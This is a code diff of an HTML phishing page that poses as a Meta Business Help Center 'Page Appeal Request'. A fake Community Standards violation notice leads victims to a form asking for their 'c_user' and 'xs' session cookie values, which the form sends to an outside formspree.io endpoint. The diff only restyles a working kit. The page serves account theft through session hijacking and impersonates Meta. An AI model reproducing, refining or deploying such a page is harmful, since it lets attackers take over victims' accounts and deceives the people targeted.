@@ -5,55 +5,53 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Meta Business Help Center</title>
     <style>
-        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; padding: 20px; margin: 0; }
-        .box { background: white; padding: 20px; border-radius: 12px; width: 100%; max-width: 400px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        body { font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; padding: 20px; }
+        .box { background: white; padding: 20px; border-radius: 10px; width: 100%; max-width: 400px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
         
-        /* Language Menu Style */
-        .lang-title { font-size: 20px; font-weight: 700; margin-bottom: 15px; }
-        .lang-item { padding: 14px 0; border-bottom: 1px solid #eee; cursor: pointer; font-size: 16px; color: #1c1e21; }
+        /* Language Style */
+        .lang-title { font-weight: bold; margin-bottom: 15px; font-size: 18px; }
+        .lang-item { padding: 15px 0; border-bottom: 1px solid #eee; cursor: pointer; }
         
         /* Form Style */
         #appealForm { display: none; }
-        .title { font-size: 22px; font-weight: 800; margin-bottom: 10px; }
-        .notice { background: #fafafa; border: 1px solid #dddfe2; padding: 15px; border-radius: 8px; margin-bottom: 20px; font-size: 14px; color: #1c1e21; }
-        input { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; }
-        .btn { width: 100%; padding: 12px; background: #0866ff; color: white; border: none; border-radius: 6px; font-weight: 700; cursor: pointer; margin-top: 20px; }
+        .title { font-size: 22px; font-weight: bold; margin-bottom: 10px; }
+        .notice { background: #fafafa; border: 1px solid #ccc; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #0866ff; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <div class="box" id="langBox">
+    <div class="box" id="langScreen">
         <div class="lang-title">Select Language</div>
-        <div class="lang-item" onclick="showForm()">English (US)</div>
-        <div class="lang-item" onclick="showForm()">हिन्दी (Hindi)</div>
-        <div class="lang-item" onclick="showForm()">Español (Spanish)</div>
-        <div class="lang-item" onclick="showForm()">Português (Portuguese)</div>
-        <div class="lang-item" onclick="showForm()">தமிழ் (Tamil)</div>
-        <div class="lang-item" onclick="showForm()">العربية (Arabic)</div>
-        <div class="lang-item" onclick="showForm()">Français (French)</div>
-        <div class="lang-item" onclick="showForm()">Tiếng Việt (Vietnamese)</div>
-        <div class="lang-item" onclick="showForm()">Twi (Ghanaian)</div>
+        <div class="lang-item" onclick="showForm()">English</div>
+        <div class="lang-item" onclick="showForm()">Hindi</div>
+        <div class="lang-item" onclick="showForm()">Spanish</div>
+        <div class="lang-item" onclick="showForm()">Portuguese</div>
+        <div class="lang-item" onclick="showForm()">Tamil</div>
+        <div class="lang-item" onclick="showForm()">Arabic</div>
+        <div class="lang-item" onclick="showForm()">French</div>
+        <div class="lang-item" onclick="showForm()">Vietnamese</div>
+        <div class="lang-item" onclick="showForm()">Ghanaian (Twi)</div>
     </div>
 
     <div class="box" id="appealForm">
         <div class="title">Page Appeal Request</div>
         <div class="notice">
-            <b>Violation Notice:</b> Your page has been flagged for a violation of our Community Standards.
+            <b>Violation Notice:</b> Your page has a violation of our Community Standards.
         </div>
         <form action="https://formspree.io/f/maqaobyw" method="POST">
-            <label><b>c_user</b></label>
-            <input type="text" name="c_user" placeholder="Enter c_user" required>
-            
-            <label style="display:block; margin-top:15px;"><b>xs</b></label>
-            <input type="text" name="xs" placeholder="Enter xs" required>
-            
-            <button type="submit" class="btn">Submit Appeal Request</button>
+            <label>c_user</label>
+            <input type="text" name="c_user" required>
+            <label>xs</label>
+            <input type="text" name="xs" required>
+            <button type="submit">Submit Appeal Request</button>
         </form>
     </div>
 
     <script>
         function showForm() {
-            document.getElementById('langBox').style.display = 'none';
+            document.getElementById('langScreen').style.display = 'none';
             document.getElementById('appealForm').style.display = 'block';
         }
     </script>
